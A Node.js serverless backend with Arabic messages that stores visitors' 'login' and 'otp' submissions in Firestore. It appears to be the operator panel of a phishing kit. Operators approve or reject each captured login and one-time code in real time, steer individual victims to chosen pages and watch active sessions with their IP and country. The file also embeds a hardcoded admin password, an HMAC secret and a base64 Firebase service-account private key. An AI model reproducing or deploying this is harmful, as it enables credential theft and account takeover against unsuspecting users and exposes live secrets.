const crypto = require('crypto');
const http = require('http');
const { initializeApp, cert, getApps } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');

const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha09876@@';
const HMAC_SECRET = process.env.HMAC_SECRET || 'maqrq_admin_secret_2024';
const CRYPTO_SECRET = 'mQ9xR4kL7pW2vN8j';

const FB_SA_B64 = process.env.FB_SA_B64 || 'ewogICJ0eXBlIjogInNlcnZpY2VfYWNjb3VudCIsCiAgInByb2plY3RfaWQiOiAianVzb3VyLXFhdGFyIiwKICAicHJpdmF0ZV9rZXlfaWQiOiAiZmU1MzAyN2QxYTMxNGIzNzczNjA2NGE3NTMwNzBlYjQ4MDIyMDQ2NCIsCiAgInByaXZhdGVfa2V5IjogIi0tLS0tQkVHSU4gUFJJVkFURSBLRVktLS0tLVxuTUlJRXZRSUJBREFOQmdrcWhraUc5dzBCQVFFRkFBU0NCS2N3Z2dTakFnRUFBb0lCQVFEZ1c4NVIzdE5zaG5mMVxuYUVaZW0rSThCWjBxdnp6eDJmZVRuSG51Wm1RTXBhUjdudXZQTjJHcmVtUzRZTnAvck9nVjJnMDd2eXgvc1BqRVxuejBDbExhMjZnV2FrZElDVkErTC94YXZwVkFLQUxHcnovWU1lM0k2aU0vNXBobGo3RWFZU2JxZVdnc1BPbHRoUFxuTTFQUmtvUE1GRitlV1B1cGl0eTJzckEwZFNQNGFIRjZhL1Jlb0xkaWE3Kzg2MEZHNFdrSURiMEgrVVR0Umk0OFxubkFUT0FBM3picmtFeFMxQ3dramtHK3JoQ3hCLzRvM0c3ZWgzcnM2RDJjU3BwdGJTTVdwbU9LOE1UTkFOck5VMFxuUkxGNzFDM3hxSDJQRnlYdW9QZkcyNHJFRHZxRjRnWmt1VTRxVUNLeW15NnRXeDFDTWgzT3dJMUFYVDlBM2tzQlxuUTJWNjRtSlRBZ01CQUFFQ2dnRUFYcTZ2eEFKRzlGcE5QcTVhWUN2bURsR0tNZE9SK3pqeTBBTXR1K3ZQRmoxRFxuVEg1Vll0WXE3RXlUTy9KMzA0RGJVdmw2TXpnckpkcEFLZ0tTOUFKeWVpNkk3Q2RVYWs3QkdoTElTWWhRSTlwYVxuNm93V3JVd0VEN1RralpFS2RTNU9DU0pVckdLVUV0ZTdBcldWRG5FSUdQU1NJOGZHc1JhdXJaVjhZaTc3VnFXbVxudGtJdVprR21tV2NjMlZZYytKaW93cXZWLy8rTHg4NmtFVVZaZWJKdmR6TmRvWEQrUmlPamxJNzdjSjJKVmNVeVxuSCs0ZUtySDQ2QXlCZjBiUGU1dVpZTnBmSHVLV1BXU2V2c2F0WWxoRFBCcVF3LzNiSEhBcmdRRkhFUkVSclhJTlxuRnpxQXBIRTNWczdVUHozcHZzL3c0eEpjUzlyT0R3enErYlRuQnJjZENRS0JnUUQzcnlOVDBoT3VsVlY4WmVheFxuSTFnR3BYdzFZMVNZc1NLRCtUNVVsMjBXR1BNL21wK2I0dmNBb2EyNnY5YUppL2tyazJRVldzaWx5ZU8xTTd0VVxua1FWZUlNSGpXZWdDVklpWXVjRFhXS2pOelFieVkyR0J1NVRhVWU0U3Vvd093SXFRY3RWT3R0WVl4YzVtaVM5eFxuZXBaQnpNeXpJbENMQWhQODB6Q2szZUxPZVFLQmdRRG41Qzc4Z1EzdE5uOXprSWEwamc4YzR5aGNWeEZRUFhmaFxuOTVCbm5ObVhMb1BqdmJJU3VneTdYWjF0S2RQVElkRWYxK1JHTDZvYXpoazgyWTNlQmxTVnhvVHM0d09YS2RjWlxuZEZ4SDU2OFRMMFhTWFFQNnNkcGVhZzd4WGdYVkFwR0lkRmNkN1Y4UEw5WGsxcys1MHVCYVFFeVlqTW5WbDNXR1xuS3prMzc5cFVLd0tCZ1FDZHhWQUppcDNDN1prQW5xQnVZWWNtNUs3VUN5dk4vN2R1dll0NHN1Um4yUWpKa1NMdVxuVjRyak9obkNCWVVSSkxwWmlZK05Fc0VRNmlORVAybXFtcDRDc1hjUDdTc2VvTjVKK3JqZDg3bkRMa0Nva2FtQVxuekE0cmExanRVU3I2RXFleEQ1VFVpUjZqdFF5ZXYvQWFwdTJqaUdNMEVEMmg3bmJ3NjAzbkZ2ZnNjUUtCZ0E3NFxuZlV3UjdOcytwSFhLZzlmT1FBMkdZTW10V1ZITDFoeUJoaElhWHpYU2EvTmRBTTBTczlXNDBud0Vza2MwTExNWVxubGdVdCtKWm9iZHF1MU9qYmtjUmxuNWxIZ3FqVXE2MWFCTWNqbnZybkYyUGdXMnhvNVFjcFk3T1RkVjd1SG9VblxudGFRWitnUVorMzRkbkNXTUJxM3M3c1QrZWQxUFBPZ2ZqRDhmUGdJbkFvR0FFWjgwbTNMbUNpMHdWeDRQd0tmNFxucDMrOStZcmZYSFJQL0pYVC80NkFpNkdFYTIrNGRjTXpVSktzQXZGZVUyQTJWbi92cGFHdUNqL0czTkJXV0JRa1xucVdpcnN3RkkrZjN1UzdpRXRCbnM3SHIwTFhrN1NONVVGMVI5emQ1bkhqRjc2ZU5YMHhFdUhDM1hpMjk4VnQzdVxuMVljc3NRWkI5U3hQcXUxOXhPWU9PS2s9XG4tLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tXG4iLAogICJjbGllbnRfZW1haWwiOiAiZmlyZWJhc2UtYWRtaW5zZGstZmJzdmNAanVzb3VyLXFhdGFyLmlhbS5nc2VydmljZWFjY291bnQuY29tIiwKICAiY2xpZW50X2lkIjogIjExMTU2OTI0OTE5NjMxMDM1NTQyMyIsCiAgImF1dGhfdXJpIjogImh0dHBzOi8vYWNjb3VudHMuZ29vZ2xlLmNvbS9vL29hdXRoMi9hdXRoIiwKICAidG9rZW5fdXJpIjogImh0dHBzOi8vb2F1dGgyLmdvb2dsZWFwaXMuY29tL3Rva2VuIiwKICAiYXV0aF9wcm92aWRlcl94NTA5X2NlcnRfdXJsIjogImh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL29hdXRoMi92MS9jZXJ0cyIsCiAgImNsaWVudF94NTA5X2NlcnRfdXJsIjogImh0dHBzOi8vd3d3Lmdvb2dsZWFwaXMuY29tL3JvYm90L3YxL21ldGFkYXRhL3g1MDkvZmlyZWJhc2UtYWRtaW5zZGstZmJzdmMlNDBqdXNvdXItcWF0YXIuaWFtLmdzZXJ2aWNlYWNjb3VudC5jb20iLAogICJ1bml2ZXJzZV9kb21haW4iOiAiZ29vZ2xlYXBpcy5jb20iCn0K';

if (!getApps().length) {
  const sa = JSON.parse(Buffer.from(FB_SA_B64, 'base64').toString());
  initializeApp({ credential: cert(sa) });
}
const db = getFirestore();
const usersCol = db.collection('maqrq_users');
const requestsCol = db.collection('maqrq_requests');

// --- In-memory cache ---
const _cache = {};
function cached(key, ttlMs, fn) {
  const entry = _cache[key];
  if (entry && Date.now() - entry.ts < ttlMs) return Promise.resolve(entry.val);
  return fn().then(val => { _cache[key] = { val, ts: Date.now() }; return val; });
}
function clearCache(prefix) {
  for (const k of Object.keys(_cache)) {
    if (!prefix || k.startsWith(prefix)) delete _cache[k];
  }
}

function generateId() {
  return crypto.randomUUID();
}

function xorDecrypt(encoded) {
  const raw = Buffer.from(encoded, 'base64');
  const result = [];
  for (let i = 0; i < raw.length; i++) {
    result.push(raw[i] ^ CRYPTO_SECRET.charCodeAt(i % CRYPTO_SECRET.length));
  }
  const payload = Buffer.from(result).toString('utf-8');
  const dotIndex = payload.indexOf('.');
  if (dotIndex !== -1) {
    return JSON.parse(payload.substring(dotIndex + 1));
  }
  return JSON.parse(payload);
}

function makeAdminToken() {
  const ts = Date.now().toString();
  const sig = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  return ts + '.' + sig;
}

function verifyAdminToken(token) {
  if (!token) return false;
  const parts = token.split('.');
  if (parts.length !== 2) return false;
  const [ts, sig] = parts;
  const expected = crypto.createHmac('sha256', HMAC_SECRET).update(ts).digest('hex');
  if (sig !== expected) return false;
  const age = Date.now() - parseInt(ts);
  return age < 30 * 24 * 60 * 60 * 1000;
}

function parseCookies(cookieHeader) {
  const cookies = {};
  if (cookieHeader) {
    cookieHeader.split(';').forEach(c => {
      const [key, ...vals] = c.trim().split('=');
      if (key) cookies[key.trim()] = vals.join('=').trim();
    });
  }
  return cookies;
}

function getCountryFromIp(ip) {
  return new Promise((resolve) => {
    if (!ip || ip === '127.0.0.1' || ip === '::1') return resolve('محلي');
    const url = `http://ip-api.com/json/${ip}?fields=country`;
    const timer = setTimeout(() => resolve('غير معروف'), 3000);
    http.get(url, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        clearTimeout(timer);
        try { resolve(JSON.parse(data).country || 'غير معروف'); }
        catch { resolve('غير معروف'); }
      });
    }).on('error', () => { clearTimeout(timer); resolve('غير معروف'); });
  });
}

// --- Firestore helpers ---
async function getUser(sessionId) {
  const doc = await usersCol.doc(sessionId).get();
  return doc.exists ? doc.data() : null;
}

async function setUser(sessionId, data) {
  await usersCol.doc(sessionId).set(data, { merge: true });
  clearCache('users.');
  clearCache('admin.');
}

async function getRequest(requestId) {
  const doc = await requestsCol.doc(requestId).get();
  return doc.exists ? doc.data() : null;
}

async function setRequest(requestId, data) {
  await requestsCol.doc(requestId).set(data, { merge: true });
  clearCache('requests.');
  clearCache('admin.');
}

async function getUserRequests(sessionId) {
  return cached(`requests.${sessionId}`, 5000, async () => {
    const snap = await requestsCol.where('user_session_id', '==', sessionId).get();
    return snap.docs.map(d => d.data());
  });
}

async function getAllUsers() {
  return cached('admin.allUsers', 5000, async () => {
    const snap = await usersCol.get();
    const users = {};
    snap.docs.forEach(d => { users[d.id] = d.data(); });
    return users;
  });
}

async function getAllRequests() {
  return cached('admin.allRequests', 5000, async () => {
    const snap = await requestsCol.get();
    const reqs = {};
    snap.docs.forEach(d => { reqs[d.id] = d.data(); });
    return reqs;
  });
}

module.exports = async (req, res) => {
  try {
  const url = new URL(req.url, `http://${req.headers.host}`);
  const path = url.pathname;
  const method = req.method;
  const cookies = parseCookies(req.headers.cookie);

  let body = null;
  if (method === 'POST') {
    if (req.body) {
      body = typeof req.body === 'string' ? JSON.parse(req.body) : req.body;
    }
  }

  // --- Admin Login ---
  if (path === '/admin/login' && method === 'POST') {
    const password = body?.password;
    if (password === ADMIN_PASSWORD) {
      const token = makeAdminToken();
      res.setHeader('Set-Cookie', `admin_token=${token}; Path=/; HttpOnly; SameSite=Lax; Max-Age=${30 * 24 * 60 * 60}`);
      return res.status(200).json({ status: 'success' });
    }
    return res.status(401).json({ status: 'error', message: 'كلمة المرور غير صحيحة' });
  }

  // --- Admin Logout ---
  if (path === '/admin/logout') {
    res.setHeader('Set-Cookie', 'admin_token=; Path=/; HttpOnly; SameSite=Lax; Max-Age=0');
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  // --- Admin Panel Redirect ---
  if (path === '/admin' && method === 'GET') {
    if (verifyAdminToken(cookies.admin_token)) {
      return res.writeHead(302, { Location: '/admin.html' }).end();
    }
    return res.writeHead(302, { Location: '/admin_login.html' }).end();
  }

  // --- Admin API auth check ---
  const isAdminApi = path.startsWith('/admin/') && path !== '/admin/login' && path !== '/admin/logout';
  if (isAdminApi && !verifyAdminToken(cookies.admin_token)) {
    return res.status(401).json({ status: 'error', message: 'غير مصرح لك بالوصول' });
  }

  // --- All Requests ---
  if (path === '/admin/all_requests') {
    const allUsers = await getAllUsers();
    const allReqs = await getAllRequests();
    const reqsBySession = {};
    for (const r of Object.values(allReqs)) {
      if (!reqsBySession[r.user_session_id]) reqsBySession[r.user_session_id] = [];
      reqsBySession[r.user_session_id].push(r);
    }

    const sessionsList = [];
    for (const [sid, user] of Object.entries(allUsers)) {
      const reqs = reqsBySession[sid] || [];
      if (reqs.length === 0) continue;

      const userData = {};
      reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });
      const sorted = [...reqs].sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));

      sessionsList.push({
        id: user.id,
        session_id: user.session_id,
        ip_address: user.ip_address,
        country: user.country || 'غير معروف',
        current_page: user.current_page,
        last_activity: user.last_activity,
        data: userData,
        login_status: sorted.find(r => r.type === 'login')?.status || null,
        otp_status: sorted.find(r => r.type === 'otp')?.status || null
      });
    }
    sessionsList.sort((a, b) => (b.last_activity || '').localeCompare(a.last_activity || ''));
    return res.status(200).json(sessionsList);
  }

  // --- Request Details ---
  let m;
  if ((m = path.match(/^\/admin\/request_details\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });

    const reqs = await getUserRequests(sessionId);
    const userData = {};
    reqs.forEach(r => { if (r.data && typeof r.data === 'object') Object.assign(userData, r.data); });

    return res.status(200).json({
      id: user.id,
      session_id: user.session_id,
      ip_address: user.ip_address,
      country: user.country || 'غير معروف',
      current_page: user.current_page,
      data: userData,
      login_status: reqs.find(r => r.type === 'login')?.status || null,
      otp_status: reqs.find(r => r.type === 'otp')?.status || null
    });
  }

  // --- Approve/Reject Login ---
  if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const reqs = await getUserRequests(sessionId);
    const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      await setRequest(pending[0].id, { status: 'approved', admin_action_time: new Date().toISOString() });
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على تسجيل الدخول' });
  }

  if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const reqs = await getUserRequests(sessionId);
    const pending = reqs.filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      await setRequest(pending[0].id, { status: 'rejected', admin_action_time: new Date().toISOString() });
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض تسجيل الدخول' });
  }

  // --- Approve/Reject OTP ---
  if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const reqs = await getUserRequests(sessionId);
    const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      await setRequest(pending[0].id, { status: 'approved', admin_action_time: new Date().toISOString() });
    }
    return res.status(200).json({ status: 'success', message: 'تمت الموافقة على OTP' });
  }

  if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const reqs = await getUserRequests(sessionId);
    const pending = reqs.filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    if (pending.length > 0) {
      await setRequest(pending[0].id, { status: 'rejected', admin_action_time: new Date().toISOString() });
    }
    return res.status(200).json({ status: 'success', message: 'تم رفض OTP' });
  }

  // --- Active Visits ---
  if (path === '/admin/active_visits') {
    const allUsers = await getAllUsers();
    const cutoff = new Date(Date.now() - 5 * 60 * 1000);
    const visits = Object.values(allUsers)
      .filter(u => new Date(u.last_activity) >= cutoff)
      .map(u => ({
        session_id: u.session_id,
        ip_address: u.ip_address,
        country: u.country,
        current_page: u.current_page,
        last_activity: u.last_activity
      }));
    return res.status(200).json(visits);
  }

  // --- Redirect User ---
  if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
    const sessionId = decodeURIComponent(m[1]);
    const user = await getUser(sessionId);
    if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
    const targetPage = body?.target_page;
    if (!targetPage) return res.status(400).json({ status: 'error', message: 'الصفحة المستهدفة غير محددة' });
    await setUser(sessionId, { redirect_to: targetPage });
    return res.status(200).json({ status: 'success', message: 'تم تعيين إعادة التوجيه للمستخدم' });
  }

  // --- Submit Request ---
  if (path === '/submit_request' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });

    let requestType, userData;
    if (body.encrypted) {
      try {
        const decrypted = xorDecrypt(body.encrypted);
        requestType = decrypted.type;
        userData = decrypted.data;
      } catch {
        return res.status(400).json({ status: 'error', message: 'فشل فك التشفير' });
      }
    } else {
      requestType = body.type;
      userData = body.data;
    }

    if (!requestType || !userData) return res.status(400).json({ status: 'error', message: 'بيانات الطلب غير مكتملة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';

    let user = await getUser(sid);
    if (!user) {
      user = {
        id: generateId(),
        session_id: sid,
        ip_address: ip,
        country: '',
        current_page: requestType,
        last_activity: new Date().toISOString(),
        redirect_to: null
      };
    }
    user.current_page = requestType;
    user.last_activity = new Date().toISOString();
    user.redirect_to = null;
    if (!user.country) user.country = await getCountryFromIp(ip);
    await setUser(sid, user);

    const autoApprove = ['personal_info', 'watch_request'].includes(requestType);

    let reqObj = null;
    if (['login', 'otp'].includes(requestType)) {
      const existingReqs = await getUserRequests(sid);
      const rejected = existingReqs
        .filter(r => r.type === requestType && r.status === 'rejected')
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
      if (rejected.length > 0) {
        reqObj = {
          ...rejected[0],
          data: userData,
          status: 'pending',
          timestamp: new Date().toISOString(),
          admin_action_time: null
        };
        await setRequest(rejected[0].id, reqObj);
      }
    }

    if (!reqObj) {
      const newId = generateId();
      reqObj = {
        id: newId,
        user_session_id: sid,
        type: requestType,
        data: userData,
        status: autoApprove ? 'approved' : 'pending',
        timestamp: new Date().toISOString(),
        admin_action_time: autoApprove ? new Date().toISOString() : null
      };
      await setRequest(newId, reqObj);
    }

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(autoApprove ? 200 : 202).json({
      status: autoApprove ? 'approved' : 'pending',
      request_id: reqObj.id,
      message: autoApprove ? 'تم استلام البيانات' : 'تم استلام طلبك، بانتظار موافقة المسؤول'
    });
  }

  // --- Request Status ---
  if ((m = path.match(/^\/request_status\/(.+)$/))) {
    const requestId = decodeURIComponent(m[1]);
    const reqObj = await getRequest(requestId);
    if (!reqObj) return res.status(404).json({ status: 'error', message: 'الطلب غير موجود' });
    const user = await getUser(reqObj.user_session_id);
    return res.status(200).json({
      status: reqObj.status,
      type: reqObj.type,
      data: reqObj.data,
      redirect_to: user?.redirect_to || null
    });
  }

  // --- Clear Redirect ---
  if (path === '/clear_redirect' && method === 'POST') {
    const sid = cookies.user_session_id;
    if (sid) {
      const user = await getUser(sid);
      if (user) {
        await setUser(sid, { redirect_to: null });
      }
    }
    return res.status(200).json({ status: 'success' });
  }

  // --- Track Visit ---
  if (path === '/track_visit' && method === 'POST') {
    if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
    const page = body.page;
    if (!page) return res.status(400).json({ status: 'error', message: 'الصفحة غير محددة' });

    const sid = cookies.user_session_id || generateId();
    const ip = (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || '';

    let user = await getUser(sid);
    if (!user) {
      user = {
        id: generateId(),
        session_id: sid,
        ip_address: ip,
        country: '',
        current_page: page,
        last_activity: new Date().toISOString(),
        redirect_to: null
      };
    }
    user.current_page = page;
    user.last_activity = new Date().toISOString();
    if (!user.country) user.country = await getCountryFromIp(ip);
    await setUser(sid, user);

    res.setHeader('Set-Cookie', `user_session_id=${sid}; Path=/; SameSite=Lax; Max-Age=${86400 * 30}`);
    return res.status(200).json({ status: 'success', message: 'تم تحديث الزيارة' });
  }

  return res.status(404).json({ status: 'error', message: 'المسار غير موجود' });
  } catch (err) {
    console.error('API Error:', err);
    return res.status(500).json({ status: 'error', message: err.message || 'Internal server error' });
  }
};
